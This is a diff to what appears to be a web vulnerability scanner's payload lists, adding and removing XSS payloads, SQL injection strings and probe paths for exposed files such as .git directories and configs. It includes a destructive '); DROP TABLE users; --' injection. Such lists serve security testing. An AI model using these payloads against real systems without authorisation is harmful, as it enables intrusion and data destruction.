@@ -7,7 +7,6 @@ XSS_PAYLOADS = [
     "<iframe id=x onblur=alert(1)></iframe><input autofocus>,medium",
     "<input onblur=alert(1) id=x><input autofocus>,medium",
     "<textarea onblur=alert(1) id=x></textarea><input autofocus>,medium",
-    "<button onblur=alert(1) id=x></button><input autofocus>,medium",
     "<select onblur=alert(1) id=x></select><input autofocus>,medium",
     "<p><script>/* Bad stuff here... */</script></p>,high",
     "<p>This post was extremely helpful.</p>,low",
@@ -19,14 +18,10 @@ XSS_PAYLOADS = [
     "<a onafterscriptexecute=alert(1)><script>1</script>,high",
     "<a onbeforecopy=\"alert(1)\" contenteditable>test</aedium",
     "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>,high",  
-    "<math><mi><mtext><img src=x onerror=alert(1)></mtext></mi></math>,high",
     "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>,high",
     "<details open ontoggle=alert(1)></details>,high",
     "<video><source onerror=\"alert(1)\"></video>,high",
-    "<script>document['write']('<img src=x onerror=alert(1)>')</script>,high",
     "<<script>><<alert>(1)//<</script>>,high", 
-    "<object data='javascript:alert(1)'></object>,high",
-    "<base href='javascript://'><a href='/.' onclick=alert(1)>Click</a>,high",
     "<input type='text' name='username'>,low",
     "<div class='message'>Welcome back!</div>,low",
     "<a href='https://example.com'>Click here</a>,low",
@@ -38,19 +33,13 @@ XSS_PAYLOADS = [
     "<button type='submit'>Submit</button>,low",
     "<svg><animate onbegin=alert(1) attributeName=x dur=1s>,high",
     "<iframe src='javascript:alert(1)'></iframe>,high",
-    "<link rel='stylesheet' href='javascript:alert(1)'>,high",
-    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>,high",
-    "<details ontoggle=\"alert(1)\"><summary>Click</summary></details>,high",
     "<script>eval(String.fromCharCode(88,83,83))</script>,high",
     "<img src=x onerror=alert(1)>,high",
     "<img src=x onerror=eval('alert(1)')>,high",
     "<script>eval('alert(1)')</script>,high",
     "<script>window.onload=alert(1)</script>,high",
-    "<svg><animate attributeName='x' values='0;10' dur='1s' onbegin='alert(1)'></animate></svg>,high",
     "<a href='javascript:alert(1)'>Click Here</a>,medium",
     "<iframe src='javascript:alert(1)'></iframe>,high",
-    "<audio autoplay><source src='test.mp3' onerror='alert(1)'></audio>,high",
-    "<video autoplay><source src='test.mp4' onerror='alert(1)'></video>,high",
     "<button onfocus='alert(1)'>Click Me</button>,medium",
     "<textarea onfocus='alert(1)'></textarea>,medium",
     "<a onmouseover='alert(1)'>Hover Me</a>,medium",
@@ -58,7 +47,19 @@ XSS_PAYLOADS = [
     "<input type='image' src='x' onerror='alert(1)'>,high",
     "<form onsubmit='alert(1)'><input type='submit'></form>,low",
     "<img src=x oNerror=alert(1)>,high",
-    "<img \"\"\"><script>alert(1)</script>,high"
+    "<img \"\"\"><script>alert(1)</script>,high",
+    "<script>alert`1`</script>,high",
+    "<script>throw onerror=alert;'XSS'</script>,high", 
+    "<style><img src='x' onerror='alert(1)'></style>,high", 
+    "<input type='search' onsearch='alert(1)'>,medium",
+    "<marquee onstart='alert(1)'>Hello</marquee>,medium", 
+    "<select onchange='alert(1)'><option>Test</option></select>,medium",
+    "<details open ontoggle='alert(1)'></details>,high",
+    "<object type='text/html' data='data:text/html,<script>alert(1)</script>'></object>,high",
+    "<isindex onbeforeactivate='alert(1)'></isindex>,high",
+    "<body onunload='alert(1)'>,high",
+    "<iframe onload='alert(1)'></iframe>,high"
+
 
 ]
 
@@ -136,8 +137,13 @@ SQLI_PAYLOADS = [
     "' OR (SELECT user()) --,high",
     "1' AND 'x'='x' --,medium",
     "' OR '1'='1' LIMIT 1 OFFSET 0 --,high",
-    "1' OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name='users') --,high"
-]
+    "1' OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name='users') --,high",
+        "%27 OR 1=1 --,high",
+    "\" OR 1=1 --,high",
+    "` OR 1=1 --,high",
+    "); DROP TABLE users; --,high"
+    
+    ]
 
 
 
@@ -204,7 +210,26 @@ SENSITIVE_FILES = [
     "/.idea/workspace.xml,medium",
     "/docker-compose.yml,medium",
     "/composer.lock,medium",
-    "/yarn.lock,low"
+    "/yarn.lock,low",
+     "/api/.git/,high",
+    "/mobile/.git/,high",
+    "/files/.git/,high",
+    "/assets/.git/,high",
+    "/cache/,medium",
+    "/temp/,medium",
+    "/tmp/,medium",
+    "/sessions/,medium", 
+    "/gulpfile.js,medium",
+    "/webpack.config.js,medium",
+    "/package.json,medium",
+    "/bower.json,medium",
+    "/manifest.json,medium",
+    "/security.txt,low",
+    "/.well-known/security.txt,low",
+    "/CHANGELOG.md,low",
+    "/README.md,low",
+    "/LICENSE,low",
+    "/COPYING,low"
 
 ]
 
